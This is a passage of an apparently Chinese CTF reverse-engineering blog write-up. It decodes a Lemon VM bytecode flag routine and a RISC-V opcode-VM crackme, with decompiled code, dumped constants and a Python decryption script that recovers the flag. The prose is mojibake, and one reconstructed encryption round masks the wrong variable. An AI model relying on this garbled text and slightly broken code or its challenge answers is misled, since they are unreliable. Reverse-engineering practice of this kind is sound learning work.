class="number">334234642</span>, <span class="number">524809386</span>, <span class="number">333469062</span>, <span class="number">160092960</span>, <span class="number">126810196</span>, <span class="number">238089888</span>, <span class="number">301365991</span>, <span class="number">258515107</span>, <span class="number">424705310</span>, <span class="number">1041878913</span>, <span class="number">618187854</span>, <span class="number">4680810</span>, <span class="number">827308967</span>, <span class="number">66957703</span>, <span class="number">924471115</span>, <span class="number">735310319</span>, <span class="number">541128627</span>, <span class="number">47689903</span>, <span class="number">459905620</span>, <span class="number">495518230</span>, <span class="number">167708778</span>, <span class="number">586337393</span>, <span class="number">521761774</span>, <span class="number">861166604</span>, <span class="number">626644061</span>, <span class="number">1030425184</span>, <span class="number">665229750</span>, <span class="number">330150339</span>]</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; n):</span><br><span class="line">            self.enc.append(<span class="built_in">next</span>())</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self,x,y</span>):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">35</span>) :</span><br><span class="line">            self.flag.append(x[i] ^ y[i])</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting...&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_run = RunMe(<span class="number">35</span>)</span><br><span class="line">my_run.sign(my_run.enc, my_run.res)</span><br><span class="line"><span class="built_in">print</span>(my_run.flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Done!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ç”¨pythonè¿è¡Œå¾—ä¸åˆ°ç»“æœâ€¦ è²Œä¼¼æ˜¯å–æ¨¡è¿ç®—ä¸å¤ªä¸€æ ·? æ€»ä¹‹è¦è¿˜åŸæˆlemonåç”¨å®ƒè‡ªå·±çš„ç¼–è¯‘å™¨è¿è¡Œ</p>
<p>å¤§è‡´è®°å½•ä¸€ä¸‹å§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const 27 ; 221492336    // LCG</span><br><span class="line">35: store 0 0 </span><br><span class="line">38: const 28 ; next </span><br><span class="line">43: define 0 0 0 0 80</span><br><span class="line">52: load 1 0</span><br><span class="line">55: const 29 ; 3735928559 </span><br><span class="line">60: mul</span><br><span class="line">61: const 30 ; 2974593325 </span><br><span class="line">66: add</span><br><span class="line">67: const 31 ; 4294967295 </span><br><span class="line">72: mod</span><br><span class="line">73: store 1 0  // (a*3735928559+2974593325)%4294967295</span><br><span class="line">76: load 1 0</span><br><span class="line">79: return</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œdefineå°±æ˜¯lemonå®šä¹‰å‡½æ•°çš„æ ¼å¼ å‰é¢çš„constå°±æ˜¯å‡½æ•°å<br>è¿™é‡Œçš„ load 1 0 åŠ è½½çš„æ˜¯å…¨å±€å˜é‡const 27<br>å°±æ˜¯ä¸€ä¸ªLCGçš„è¿‡ç¨‹ åˆå§‹seedä¸º const 27</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">self</span><br><span class="line">120: const 35 ; flag </span><br><span class="line">125: setattr</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">296: const 70 ; 2141786733 </span><br><span class="line">301: array 35</span><br><span class="line">306: self</span><br><span class="line">307: const 71 ; res </span><br><span class="line">312: setattr</span><br><span class="line">313: const 72 ; 0 </span><br><span class="line">318: store 0 1</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯å°†è¿™ä¸€å¤§å †æ•°å¾ªç¯å­˜å…¥ resé‡Œ<br>è€Œä¸”è¦æ³¨æ„ ç”±äºæ˜¯å‹æ ˆ æ‰€ä»¥è¿™æ•°ç»„æ˜¯å€’åºçš„ ä¹Ÿå°±æ˜¯ [2141786733,â€¦,330150339]!!!</p>
<p>ç„¶åæ˜¯è¿™ä¸€æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">321: load 0 1</span><br><span class="line">324: load 0 0</span><br><span class="line">327: lt</span><br><span class="line">328: jz 371</span><br><span class="line">333: self</span><br><span class="line">334: const 34 ; enc      // å¾ªç¯å­˜å‚¨åˆ° enc[]</span><br><span class="line">339: getattr</span><br><span class="line">340: const 73 ; append </span><br><span class="line">345: getattr</span><br><span class="line">346: load 1 1</span><br><span class="line">349: call 0</span><br><span class="line">351: call 1     </span><br><span class="line">353: pop</span><br><span class="line">354: load 0 1</span><br><span class="line">357: const 74 ; 1 </span><br><span class="line">362: add</span><br><span class="line">363: store 0 1   // +=1</span><br><span class="line">366: jmp 321</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„call 0  call 1   æ˜¯ append å’Œ next<br>æ‰€ä»¥æ˜¯ enc.append(next()) ä¹Ÿå°±æ˜¯æŠŠLCGæ¯æ¬¡å˜æ¢çš„seedå­˜å…¥encæ•°ç»„</p>
<p>ç„¶åæ˜¯è¿™æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">377: const 33 ; __init__ </span><br><span class="line">382: const 76 ; x </span><br><span class="line">387: const 77 ; y </span><br><span class="line">392: const 78 ; sign </span><br><span class="line">397: define 0 0 2 3 482</span><br><span class="line">406: const 72 ; 0 </span><br><span class="line">411: store 0 2</span><br><span class="line">414: load 0   // loop 414-471</span><br><span class="line">417: const 79 ; 35 </span><br><span class="line">422: lt</span><br><span class="line">423: jz          // for 0~35</span><br><span class="line">428: self</span><br><span class="line">429: const 35 ; flag </span><br><span class="line">434: getattr</span><br><span class="line">435: const 73 ; append         // flag.append()</span><br><span class="line">440: getattr</span><br><span class="line">441: load 0 0</span><br><span class="line">444: load 0 2</span><br><span class="line">447: getitem</span><br><span class="line">448: load 0 1</span><br><span class="line">451: load 0 2</span><br><span class="line">454: getitem</span><br><span class="line">455: bxor      // xor!</span><br><span class="line">456: call 1</span><br><span class="line">458: pop</span><br><span class="line">459: load 0 2</span><br><span class="line">462: const 74 ; 1 </span><br><span class="line">467: add</span><br><span class="line">468: store 0 2</span><br><span class="line">471: jmp 414</span><br><span class="line">476: const 75 ; nil </span><br><span class="line">481: return</span><br></pre></td></tr></table></figure>

<p>å®šä¹‰äº†ä¸€ä¸ªsignå‡½æ•°<br>ä»¥åŠx y<br>é€ä½xoråå­˜å…¥flagæ•°ç»„</p>
<p>æœ€åå°±æ˜¯åˆ›å»ºä¸€ä¸ªRunMe CLASS<br>è°ƒç”¨å…¶ä¸­çš„å‡½æ•°æ‰“å°flag<br>å¤§è‡´æµç¨‹å°±è¿™æ ·å§ è¿™é¬¼lemonå®˜æ–¹æ–‡æ¡£æŒ‚äº†ç¡®å®éš¾æâ€¦</p>
<h2 id="NOTRC4"><a href="#NOTRC4" class="headerlink" title="NOTRC4"></a>NOTRC4</h2><p>å¥½é¢˜æ¬¸<br>RISC-VæŒ‡ä»¤é›†<br>ç¥å¥‡çš„Ghidraå¯ä»¥åç¼–è¯‘â€¦<br>ç¬¬ä¸€æ¬¡ä½¿ç”¨ é¦–å…ˆè¦newä¸€ä¸ªproject ç„¶åImportFileå°±å¯ä»¥åˆ†æäº†<br>åœ¨IDAä¸­ä¹Ÿèƒ½çœ‹å‡ºæ¥è¿™æ˜¯ä¸€ä¸ªopcodeçš„é¢˜<br>æŸ¥çœ‹å‡½æ•°(å…¶ä¸­æœ‰è‡ªå·±å†™çš„æ³¨é‡Š)<br>main</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Globals starting with &#x27;_&#x27; overlap smaller symbols at the same address */</span></span><br><span class="line"></span><br><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  undefined8 OPCODE;</span><br><span class="line">  undefined8 local_78;</span><br><span class="line">  undefined8 local_70;</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  undefined8 local_60;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined8 local_50;</span><br><span class="line">  undefined8 local_48;</span><br><span class="line">  undefined8 local_40;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  <span class="type">long</span> local_18;</span><br><span class="line">  </span><br><span class="line">  local_18 = ___stack_chk_guard;</span><br><span class="line">  OPCODE = <span class="number">0</span>;</span><br><span class="line">  local_78 = <span class="number">0</span>;</span><br><span class="line">  local_70 = <span class="number">0</span>;</span><br><span class="line">  local_68 = <span class="number">0</span>;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  local_58 = <span class="number">0</span>;</span><br><span class="line">  local_50 = <span class="number">0</span>;</span><br><span class="line">  local_48 = <span class="number">0</span>;</span><br><span class="line">  local_40 = <span class="number">0</span>;</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">FUN_00100740</span>(<span class="string">&quot;Input your flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">FUN_00100720</span>(&amp;DAT_00100d78,&amp;INPUT_VALUE);</span><br><span class="line">  <span class="built_in">SET_OPCODE_AND_FUNCTIONS</span>((undefined4 *)&amp;OPCODE);</span><br><span class="line">  <span class="built_in">EXECUTE_UNDER_OPCODE</span>((<span class="type">int</span> *)&amp;OPCODE);</span><br><span class="line">  <span class="built_in">FUN_00100760</span>(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">  uVar1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (___stack_chk_guard != local_18) &#123;</span><br><span class="line">    <span class="built_in">FUN_00100730</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è®¾ç½®opcodeä»¥åŠå¯¹åº”å‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SET_OPCODE_AND_FUNCTIONS</span><span class="params">(undefined4 *param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *param_1 = <span class="number">0</span>;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">6</span>) = <span class="number">0xf1</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">8</span>) = F1_CHECK_FLAG;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">10</span>) = <span class="number">0xf2</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">0xc</span>) = F2_FUN_00100bfe;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">0xe</span>) = <span class="number">0xf3</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">0x10</span>) = F3_FUN_00100974;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">0x12</span>) = <span class="number">0xf4</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">0x14</span>) = F4_FUN_00100a10;</span><br><span class="line">  *(undefined *)(param_1 + <span class="number">0x16</span>) = <span class="number">0xf5</span>;</span><br><span class="line">  *(code **)(param_1 + <span class="number">0x18</span>) = F5_SAVE_CHANGED_VALUE;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">EXECUTE_UNDER_OPCODE</span><span class="params">(<span class="type">int</span> *param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ((&amp;DAT_00102018)[*param_1] != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">EXECUTE</span>(param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„-1å°±æ˜¯0xff ç»“æŸæ¡ä»¶<br>å…ˆå¯¼å‡ºopcode<br>è¿™ä¸ªå¯ä»¥é€šè¿‡åé¢å‡½æ•°ç¡®å®šæ˜¯ DAT_00102018 å¤„çš„æ•°æ®<br>å¯¼å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f3 00 f4 e1 f4 e2 f2 04 0b f5 f3 02 f4 e1 f4 e2 f2 04 0b f5 f1 ff</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°å…¶å®æ˜¯ä¸¤ç»„é‡å¤</p>
<p>F3å‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention -- yet parameter storage is locked */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F3_FUN_00100974</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *in_a0;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* 21 74 62 64  dbt! */</span></span><br><span class="line">  *(<span class="type">long</span> *)(in_a0 + <span class="number">2</span>) =</span><br><span class="line">       *(<span class="type">long</span> *)(&amp;INPUT_VALUE + (<span class="type">long</span>)(<span class="type">int</span>)(uint)(byte)(&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>] * <span class="number">8</span>) +</span><br><span class="line">       DAT_00102008;</span><br><span class="line">                    <span class="comment">/* 73 64 79 79  yyds */</span></span><br><span class="line">  *(<span class="type">long</span> *)(in_a0 + <span class="number">4</span>) =</span><br><span class="line">       *(<span class="type">long</span> *)(&amp;INPUT_VALUE + (<span class="type">long</span>)(<span class="type">int</span>)((byte)(&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>] + <span class="number">1</span>) * <span class="number">8</span>) +</span><br><span class="line">       DAT_00102010;</span><br><span class="line">  *in_a0 = *in_a0 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†å†…å­˜ä¸­æ•°æ®æ³¨é‡Šå‡ºæ¥ è¿™é‡Œç»“åˆmainä¸­çš„è¾“å…¥çŸ¥é“æ˜¯å°†è¾“å…¥åˆ†åˆ«åŠ ä¸Šäº†åå…­è¿›åˆ¶å€¼ 0x64627421 0x79796473</p>
<p>F4å‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention -- yet parameter storage is locked */</span></span><br><span class="line"><span class="comment">/* 0xe1 0xe2åˆ†åˆ«å¯¹åº”æ¯æ¬¡åŠ å¯†çš„ä¸¤è½® */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F4_FUN_00100a10</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *in_a0;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* 0xe1 */</span></span><br><span class="line">  <span class="keyword">if</span> ((&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>] == <span class="number">-0x1f</span>) &#123;</span><br><span class="line">    *(ulong *)(in_a0 + <span class="number">2</span>) =</span><br><span class="line">         DAT_00102008 +</span><br><span class="line">         ((*(ulong *)(in_a0 + <span class="number">4</span>) ^ *(ulong *)(in_a0 + <span class="number">2</span>)) &gt;&gt;</span><br><span class="line">          ((<span class="type">long</span>)-(<span class="type">int</span>)*(undefined8 *)(in_a0 + <span class="number">4</span>) &amp; <span class="number">0x3f</span>U) |</span><br><span class="line">         (*(ulong *)(in_a0 + <span class="number">4</span>) ^ *(ulong *)(in_a0 + <span class="number">2</span>)) &lt;&lt;</span><br><span class="line">         ((<span class="type">long</span>)(<span class="type">int</span>)*(undefined8 *)(in_a0 + <span class="number">4</span>) &amp; <span class="number">0x3f</span>U));</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* 0xe2 */</span></span><br><span class="line">  <span class="keyword">if</span> ((&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>] == <span class="number">-0x1e</span>) &#123;</span><br><span class="line">    *(ulong *)(in_a0 + <span class="number">4</span>) =</span><br><span class="line">         DAT_00102010 +</span><br><span class="line">         ((*(ulong *)(in_a0 + <span class="number">4</span>) ^ *(ulong *)(in_a0 + <span class="number">2</span>)) &gt;&gt;</span><br><span class="line">          ((<span class="type">long</span>)-(<span class="type">int</span>)*(undefined8 *)(in_a0 + <span class="number">2</span>) &amp; <span class="number">0x3f</span>U) |</span><br><span class="line">         (*(ulong *)(in_a0 + <span class="number">4</span>) ^ *(ulong *)(in_a0 + <span class="number">2</span>)) &lt;&lt;</span><br><span class="line">         ((<span class="type">long</span>)(<span class="type">int</span>)*(undefined8 *)(in_a0 + <span class="number">2</span>) &amp; <span class="number">0x3f</span>U));</span><br><span class="line">  &#125;</span><br><span class="line">  *in_a0 = *in_a0 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆšå¥½å¯¹åº”opcodeé‡Œçš„ä¸¤ä¸ªF4 åˆ†åˆ«æ˜¯ä¸¤ç»„ç›¸ä¼¼çš„åŠ å¯† ç»“åˆä¸Šä¸€ä¸ªå‡½æ•°çŸ¥é“è¿™é‡Œçš„ <code>*int_a0+2 *int_a0+4</code> å°±æ˜¯ä¸¤ä¸ªinput<br>ç„¶ååˆ°F2å‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention -- yet parameter storage is locked */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F2_FUN_00100bfe</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *in_a0;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* if xxx&lt;0b */</span></span><br><span class="line">  <span class="keyword">if</span> (DAT_00102108 &lt; (<span class="type">int</span>)(uint)(byte)(&amp;DAT_00102018)[*in_a0 + <span class="number">2</span>]) &#123;</span><br><span class="line">                    <span class="comment">/* opcode-4 --&gt; å›åˆ°å‰é¢ä¸¤ä¸ªf4å¼€å¤´çš„åœ°æ–¹</span></span><br><span class="line"><span class="comment">                       ä¹Ÿå°±æ˜¯è¯´ä¸¤æ¬¡f4é‡å¤äº†12éï¼ï¼ï¼ */</span></span><br><span class="line">    *in_a0 = *in_a0 - (uint)(byte)(&amp;DAT_00102018)[*in_a0 + <span class="number">1</span>];</span><br><span class="line">    DAT_00102108 = DAT_00102108 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    DAT_00102108 = <span class="number">0</span>;</span><br><span class="line">    *in_a0 = *in_a0 + <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒæŒºå·§å¦™çš„  ç»“åˆopcodeçš„æ•°æ® f2 04 0b<br>çŸ¥é“è¿™é‡Œå…¶å®æ˜¯ä¸€ä¸ª 0bæ¬¡çš„å¾ªç¯ è‹¥&lt;0båˆ™PC-4 ä¹Ÿå°±æ˜¯å›åˆ°å‰é¢ä¸¤ä¸ªF4å¼€å§‹çš„åœ°æ–¹<br>æ‰€ä»¥å‰é¢çš„ä¸¤æ¬¡F4é‡å¤äº†12æ¬¡</p>
<p>åé¢çš„å’Œç¬¬ä¸€è½®ç›¸ä¼¼ åªæ˜¯F3å–æ•°æ®ä»02å¼€å§‹å–å¾— ä¹Ÿå°±æ˜¯inputçš„åä¸¤ä¸ª</p>
<p>æœ€åF1å‡½æ•° checkå‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention -- yet parameter storage is locked */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F1_CHECK_FLAG</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *in_a0;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (local_14 = <span class="number">0</span>; local_14 &lt; <span class="number">4</span>; local_14 = local_14 + <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">long</span> *)(&amp;DAT_001020c8 + (<span class="type">long</span>)local_14 * <span class="number">8</span>) !=</span><br><span class="line">        *(<span class="type">long</span> *)(&amp;DAT_00102030 + (<span class="type">long</span>)local_14 * <span class="number">8</span>)) &#123;</span><br><span class="line">      <span class="built_in">FUN_00100760</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">FUN_00100750</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *in_a0 = *in_a0 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°† 0x001020c8ä¸0x00102030çš„å€¼æ¯”è¾ƒ<br>åœ¨Ghidraä¸­è½¬åˆ°bytesæŸ¥çœ‹ c8å¤„æ˜¯?è¯´æ˜æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°æ® å¯¼å‡º30å¤„çš„å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca 82 ef 95 bb 1d c2 4b be 47 b5 71 ae ec 7b f5 </span><br><span class="line">cd f6 e7 15 ab bd a1 80 85 63 77 e1 d7 93 c7 a3</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„å®ƒçš„æ¯”è¾ƒæ–¹å¼ long å’Œ +8 è¯´æ˜è¿™æ˜¯å››ä¸ªæ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4bc21dbb95ef82ca 0xf57becae71b547be</span><br><span class="line">0x80a1bdab15e7f6cd 0xa3c793d7e1776385</span><br></pre></td></tr></table></figure>

<p>å¯¹åº”è¿˜åŸåŠ å¯†ä»£ç :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="comment"># f3</span></span><br><span class="line">    <span class="built_in">input</span>[i*<span class="number">2</span>] += <span class="number">0x64627421</span></span><br><span class="line">    <span class="built_in">input</span>[i*<span class="number">2</span>+<span class="number">1</span>] += <span class="number">0x79796473</span></span><br><span class="line">    v1 = <span class="built_in">input</span>[i*<span class="number">2</span>]</span><br><span class="line">    v2 = <span class="built_in">input</span>[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>): <span class="comment"># f4</span></span><br><span class="line">        <span class="comment"># 0xe1</span></span><br><span class="line">        v1 = <span class="number">0x64627421</span>+(((v2^v1)&gt;&gt;((-v2)&amp;<span class="number">0x3f</span>))|((v2^v1)&lt;&lt;(v2&amp;<span class="number">0x3f</span>)))</span><br><span class="line">        v1 &amp;= <span class="number">0xffffffffffffffff</span> <span class="comment"># ulong</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 0xe2</span></span><br><span class="line">        v2 = <span class="number">0x79796473</span>+(((v2^v1)&gt;&gt;((-v1)&amp;<span class="number">0x3f</span>))|((v2^v1)&lt;&lt;(v1&amp;<span class="number">0x3f</span>)))</span><br><span class="line">        v1 &amp;= <span class="number">0xffffffffffffffff</span> <span class="comment"># ulong</span></span><br></pre></td></tr></table></figure>

<p>è¿™ç§åŠ å¯†è²Œä¼¼ä¹Ÿæ˜¯ä¸€ç§feistelç»“æ„å§ æ‰€ä»¥åŠ è§£å¯†å¯¹ç§°çš„ åŸæ¥çš„å·¦ç§»æ”¹ä¸ºå³ç§» è°ƒæ¢è¯­å¥å—é¡ºåºå°±èƒ½é€†å›æ¥v1^v2çš„å€¼</p>
<p>è§£å¯†ä»£ç :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">opcode:</span></span><br><span class="line"><span class="string">f3 00 f4 e1 f4 e2 f2 04 0b f5 f3 02 f4 e1 f4 e2 f2 04 0b f5 f1 ff</span></span><br><span class="line"><span class="string">checkå€¼:</span></span><br><span class="line"><span class="string">ca 82 ef 95 bb 1d c2 4b be 47 b5 71 ae ec 7b f5 cd f6 e7 15 ab bd a1 80 85 63 77 e1 d7 93 c7 a3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">input</span> = [</span><br><span class="line">    <span class="number">0x4BC21DBB95EF82CA</span>,</span><br><span class="line">    <span class="number">0xF57BECAE71B547BE</span>,</span><br><span class="line">    <span class="number">0x80A1BDAB15E7F6CD</span>,</span><br><span class="line">    <span class="number">0xA3C793D7E1776385</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># åŠ å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v1,v2</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="comment"># f3</span></span><br><span class="line">        v1 = <span class="built_in">input</span>[i*<span class="number">2</span>]</span><br><span class="line">        v2 = <span class="built_in">input</span>[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">        v1 += <span class="number">0x64627421</span></span><br><span class="line">        v2 += <span class="number">0x79796473</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>): <span class="comment"># f4</span></span><br><span class="line">            <span class="comment"># 0xe1</span></span><br><span class="line">            v1 = <span class="number">0x64627421</span>+(((v2^v1)&gt;&gt;((-v2)&amp;<span class="number">0x3f</span>))|((v2^v1)&lt;&lt;(v2&amp;<span class="number">0x3f</span>)))</span><br><span class="line">            v1 &amp;= <span class="number">0xffffffffffffffff</span> <span class="comment"># ulong</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 0xe2</span></span><br><span class="line">            v2 = <span class="number">0x79796473</span>+(((v2^v1)&gt;&gt;((-v1)&amp;<span class="number">0x3f</span>))|((v2^v1)&lt;&lt;(v1&amp;<span class="number">0x3f</span>)))</span><br><span class="line">            v1 &amp;= <span class="number">0xffffffffffffffff</span> <span class="comment"># ulong</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v1,v2</span>):</span><br><span class="line">    v2 -= <span class="number">0x79796473</span></span><br><span class="line">    v = (v2&lt;&lt;((-v1)&amp;<span class="number">0x3f</span>))|(v2&gt;&gt;(v1&amp;<span class="number">0x3f</span>))</span><br><span class="line">    v &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    v2 = v^v1</span><br><span class="line">    v2 &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    v1 -= <span class="number">0x64627421</span></span><br><span class="line">    v = (v1&lt;&lt;((-v2)&amp;<span class="number">0x3f</span>))|(v1&gt;&gt;(v2&amp;<span class="number">0x3f</span>))</span><br><span class="line">    v &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    v1 = v^v2</span><br><span class="line">    v1 &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="keyword">return</span> v1,v2</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    v1 = <span class="built_in">input</span>[i*<span class="number">2</span>]</span><br><span class="line">    v2 = <span class="built_in">input</span>[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        v1,v2 = decrypt(v1,v2)</span><br><span class="line">    v1 -= <span class="number">0x64627421</span></span><br><span class="line">    v2 -= <span class="number">0x79796473</span></span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(v1)[::-<span class="number">1</span>]+long_to_bytes(v2)[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># I_hate_U_r1sc-V!</span></span><br></pre></td></tr></table></figure>

